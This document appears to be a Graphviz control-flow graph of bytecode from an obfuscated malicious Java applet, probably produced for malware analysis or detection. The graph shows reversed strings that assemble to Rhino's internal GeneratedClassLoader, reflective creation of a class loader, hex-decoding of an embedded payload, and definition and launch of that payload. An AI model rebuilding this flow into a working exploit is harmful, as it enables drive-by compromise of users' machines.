digraph "" {
    "r0 := @this: hw"
    "new java.lang.StringBuilder"
    "r0 := @this: hw"->"new java.lang.StringBuilder";
    "dup1.r"
    "new java.lang.StringBuilder"->"dup1.r";
    "staticget <RunnerGood: java.lang.String zz>"
    "dup1.r"->"staticget <RunnerGood: java.lang.String zz>";
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"
    "staticget <RunnerGood: java.lang.String zz>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
    "push \"vaj.allizom.gro.n\""
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"push \"vaj.allizom.gro.n\"";
    "push \"us\""
    "push \"vaj.allizom.gro.n\""->"push \"us\"";
    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"
    "push \"us\""->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
    "staticinvoke <hw: java.lang.String pah(java.lang.String)>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"staticinvoke <hw: java.lang.String pah(java.lang.String)>";
    "staticinvoke <RunnerGood: java.lang.Class bug(java.lang.String)>"
    "staticinvoke <hw: java.lang.String pah(java.lang.String)>"->"staticinvoke <RunnerGood: java.lang.Class bug(java.lang.String)>";
    "staticinvoke <RunnerGood: java.lang.Class bug(java.lang.String)>"->"dup1.r";
    "push \"enter\""
    "dup1.r"->"push \"enter\"";
    "push 1"
    "push \"enter\""->"push 1";
    "staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>"
    "push 1"->"staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>";
    "push null"
    "staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>"->"push null";
    "push 0"
    "push null"->"push 0";
    "newarray"
    "push 0"->"newarray";
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"
    "newarray"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "store.r r2"
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"store.r r2";
    "push \"createClassLoader\""
    "store.r r2"->"push \"createClassLoader\"";
    "push \"createClassLoader\""->"push 0";
    "push 0"->"staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>";
    "load.r r2"
    "staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>"->"load.r r2";
    "load.r r2"->"push 1";
    "push 1"->"newarray";
    "newarray"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"store.r r2";
    "staticinvoke <test2: java.lang.String one()>"
    "store.r r2"->"staticinvoke <test2: java.lang.String one()>";
    "staticinvoke <d: byte[] decodeH(java.lang.String)>"
    "staticinvoke <test2: java.lang.String one()>"->"staticinvoke <d: byte[] decodeH(java.lang.String)>";
    "store.r r5"
    "staticinvoke <d: byte[] decodeH(java.lang.String)>"->"store.r r5";
    "push \"redaoLssalCdetareneG.lanretn\""
    "store.r r5"->"push \"redaoLssalCdetareneG.lanretn\"";
    "push \"i.tpircsavaj.all\""
    "push \"redaoLssalCdetareneG.lanretn\""->"push \"i.tpircsavaj.all\"";
    "push \"izom.gro.nus\""
    "push \"i.tpircsavaj.all\""->"push \"izom.gro.nus\"";
    "push \"izom.gro.nus\""->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"staticinvoke <hw: java.lang.String pah(java.lang.String)>";
    "staticinvoke <hw: java.lang.String pah(java.lang.String)>"->"staticinvoke <RunnerGood: java.lang.Class bug(java.lang.String)>";
    "staticget <test2: java.lang.String dd>"
    "staticinvoke <RunnerGood: java.lang.Class bug(java.lang.String)>"->"staticget <test2: java.lang.String dd>";
    "staticget <test2: java.lang.String dd>"->"push 0";
    "push 0"->"staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>";
    "store.r r7"
    "staticinvoke <codehex: java.lang.reflect.Method lot(java.lang.Class,java.lang.String,boolean)>"->"store.r r7";
    "load.r r0"
    "store.r r7"->"load.r r0";
    "staticinvoke <codehex: java.lang.String get(java.applet.Applet)>"
    "load.r r0"->"staticinvoke <codehex: java.lang.String get(java.applet.Applet)>";
    "store.r r0"
    "staticinvoke <codehex: java.lang.String get(java.applet.Applet)>"->"store.r r0";
    "store.r r0"->"load.r r0";
    "push \"::\""
    "load.r r0"->"push \"::\"";
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
    "push \"::\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
    "push -1"
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"push -1";
    "ifcmpne.i load.r r7"
    "push -1"->"ifcmpne.i load.r r7";
    "load.r r7"
    "ifcmpne.i load.r r7"->"load.r r7";
    "load.r r7"->"load.r r2";
    "push 2"
    "load.r r2"->"push 2";
    "push 2"->"newarray";
    "newarray"->"dup1.r";
    "dup1.r"->"push 1";
    "load.r r5"
    "push 1"->"load.r r5";
    "arraywrite.r"
    "load.r r5"->"arraywrite.r";
    "arraywrite.r"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "checkcast"
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"checkcast";
    "checkcast"->"push 1";
    "push 1"->"newarray";
    "newarray"->"dup1.r";
    "dup1.r"->"push 0";
    "push class \"Ljava/lang/String;\""
    "push 0"->"push class \"Ljava/lang/String;\"";
    "push class \"Ljava/lang/String;\""->"arraywrite.r";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Constructor getConstructor(java.lang.Class[])>"
    "arraywrite.r"->"virtualinvoke <java.lang.Class: java.lang.reflect.Constructor getConstructor(java.lang.Class[])>";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Constructor getConstructor(java.lang.Class[])>"->"push 1";
    "push 1"->"newarray";
    "newarray"->"dup1.r";
    "dup1.r"->"push 0";
    "push 0"->"load.r r0";
    "load.r r0"->"arraywrite.r";
    "virtualinvoke <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>"
    "arraywrite.r"->"virtualinvoke <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>";
    "pop"
    "virtualinvoke <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>"->"pop";
    "goto return"
    "pop"->"goto return";
    "return"
    "goto return"->"return";
    "virtualinvoke <java.lang.Exception: void printStackTrace()>"
    "virtualinvoke <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>"->"virtualinvoke <java.lang.Exception: void printStackTrace()>";
    "ifcmpne.i load.r r7"->"load.r r7";
    "load.r r7"->"load.r r2";
    "load.r r2"->"push 2";
    "push 2"->"newarray";
    "newarray"->"dup1.r";
    "dup1.r"->"push 1";
    "staticget <Asd: byte[] arrayOfByte2>"
    "push 1"->"staticget <Asd: byte[] arrayOfByte2>";
    "staticget <Asd: byte[] arrayOfByte2>"->"arraywrite.r";
    "arraywrite.r"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"checkcast";
    "checkcast"->"dup1.r";
    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"
    "dup1.r"->"virtualinvoke <java.lang.Class: java.lang.Object newInstance()>";
    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"->"pop";
    "pop"->"push 2";
    "push 2"->"newarray";
    "newarray"->"store.r r2";
    "store.r r2"->"load.r r2";
    "load.r r2"->"push 0";
    "push 0"->"push class \"Ljava/lang/String;\"";
    "push class \"Ljava/lang/String;\""->"arraywrite.r";
    "arraywrite.r"->"load.r r2";
    "load.r r2"->"push 1";
    "push class \"Ljava/lang/Class;\""
    "push 1"->"push class \"Ljava/lang/Class;\"";
    "push class \"Ljava/lang/Class;\""->"arraywrite.r";
    "push \"r\""
    "arraywrite.r"->"push \"r\"";
    "push \"r\""->"load.r r2";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"
    "load.r r2"->"virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"->"push 2";
    "push 2"->"newarray";
    "newarray"->"store.r r2";
    "store.r r2"->"load.r r2";
    "load.r r2"->"push 0";
    "push 0"->"load.r r0";
    "load.r r0"->"arraywrite.r";
    "arraywrite.r"->"load.r r2";
    "load.r r2"->"push 1";
    "push class \"Lhw;\""
    "push 1"->"push class \"Lhw;\"";
    "push class \"Lhw;\""->"arraywrite.r";
    "arraywrite.r"->"push null";
    "push null"->"load.r r2";
    "load.r r2"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"pop";
    "pop"->"goto return";
}
